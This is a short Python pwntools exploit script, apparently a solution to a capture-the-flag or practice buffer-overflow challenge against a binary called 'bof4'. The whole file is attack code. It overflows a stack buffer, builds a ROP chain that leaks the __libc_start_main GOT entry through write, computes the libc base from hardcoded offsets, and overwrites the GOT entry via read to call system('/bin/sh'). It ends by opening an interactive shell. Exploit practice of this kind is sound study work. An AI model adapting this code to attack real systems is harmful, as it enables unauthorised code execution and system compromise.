from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./bof4")
else:
    conn = remote(HOST, PORT)

elf = ELF('./bof4')

pop3ret = 0x08048539
__libc_start_main_rel = 0x00018180 # Ubuntu 17.10
system_rel = 0x0003a900

gdb.attach(conn)

ROP = "A" * 51

# write(1, __libc_start_main_got, 4)
ROP += p32(elf.plt['write'])
ROP += p32(pop3ret)
ROP += p32(1)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(4)

# read(0, __libc_start_main_got, 20)
ROP += p32(elf.plt['read'])
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(20)

# system('bin/sh')
ROP += p32(elf.plt['__libc_start_main'])
ROP += p32(0xBBBB)
ROP += p32(elf.got['__libc_start_main']+4)


print conn.recv(1024)
conn.sendline(ROP)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/sh")
time.sleep(0.1)

conn.interactive()
